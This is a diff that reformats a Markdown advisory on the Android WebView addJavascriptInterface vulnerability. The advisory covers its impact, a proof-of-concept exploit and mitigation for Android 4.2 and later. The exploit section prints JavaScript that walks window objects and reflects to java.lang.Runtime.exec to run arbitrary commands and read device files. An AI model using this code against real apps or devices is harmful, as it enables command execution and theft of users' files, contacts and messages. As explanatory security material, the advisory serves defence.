@@ -1,9 +1,10 @@
-###Vulnerability Description:###
+### Vulnerability Description
+
 A lot of the time we use WebView to display a Webpage,for example many applications in order to achieve the server control, many results page is Webpage, rather than the local implementation, which has many advantages, such as interface change does not need to release a new version, directly modify the line at Server end. With Webpage to display interface, usually are more or less with the Java code have interaction, such as a button click Webpage above, we need to know the button click event, or we have to call a method, make the page to perform some action, in order to achieve these interactions, we usually use JS to achieve, while WebView has provided such a method, the specific usage is as follows: 
 
 
 	mWebView.getSettings().setJavaScriptEnabled(true);  
-    mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");
+        mWebView.addJavascriptInterface(new JSInterface(), "jsInterface");
     
 We asked WebView to register a name "jsInterface" of the object, and then can access to the jsInterface object in JS, you can invoke some methods of the object, the final call to Java code, so as to realize the interaction of JS and Java code.
 We work together to have a look on the **addJavascriptInterface** method on the Android website description: 
@@ -19,7 +20,7 @@ Simply put, is to use addJavascriptInterface may lead to insecurity, because JS 
 --------
 
 
-###Vulnerablity Impact:###
+### Vulnerablity Impact:
 Through the JavaScript, anything can access the device on the SD card, and even contact information, SMS etc.. It's disgusting, quack. 
 
 1. WebView adds a JavaScript object, and the current application with SDCard read and write permissions, or: android.permission.WRITE_EXTERNAL_STORAGE
@@ -29,19 +30,20 @@ Through the JavaScript, anything can access the device on the SD card, and even 
 3. The string returned from the execution command input stream, you can get the information of the file name. Then do what you want to do, good risk. The core JS code as follows: 
 
 
-    function execute(cmdArgs)  
-    {  
-        for (var obj in window) {  
-            if ("getClass" in window[obj]) {  
+         function execute(cmdArgs)  
+        {  
+            for (var obj in window) {  
+               if ("getClass" in window[obj]) {  
                 alert(obj);  
                 return  window[obj].getClass().forName("java.lang.Runtime")  
                      .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);  
-            }  
-        }  
-    }   
+              }  
+           }  
+       }   
 
 ------
-###Exploitation:###
+
+### Exploitation
 
 In order to prove this loophole, I'm just loading a malicious JS code of the local Webpage, HTML the code as follows:
 
@@ -116,9 +118,9 @@ In order to prove this loophole, I'm just loading a malicious JS code of the loc
       </body>  
     </html>  
 
-1. Please seeexecute()The method, which the traversal of all window object, an object with a getClass method and then find, use this object class, find the java.lang.Runtime object, then call the "getRuntime" static method to get an instance of Runtime, and then call exec () method to execute a command.
-2. getContents()Methods, read from the stream, displayed in the interface.
-3. Key code is in the following sentences
+ 1. Please seeexecute()The method, which the traversal of all window object, an object with a getClass method and then find, use this object class, find the java.lang.Runtime object, then call the "getRuntime" static method to get an instance of Runtime, and then call exec () method to execute a command.
+ 2. getContents()Methods, read from the stream, displayed in the interface.
+ 3. Key code is in the following sentences
 
 `return      window[obj].getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);`
 
@@ -136,7 +138,8 @@ Need to add permissions:
     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />  
 
 ------
-###Mitigation###
+
+### Mitigation
 -  System Android 4.2 or above
 In Android 4.2 or above, Google was modified, the statement on the Java remote method of a @JavascriptInterface, as in the following code: 
 
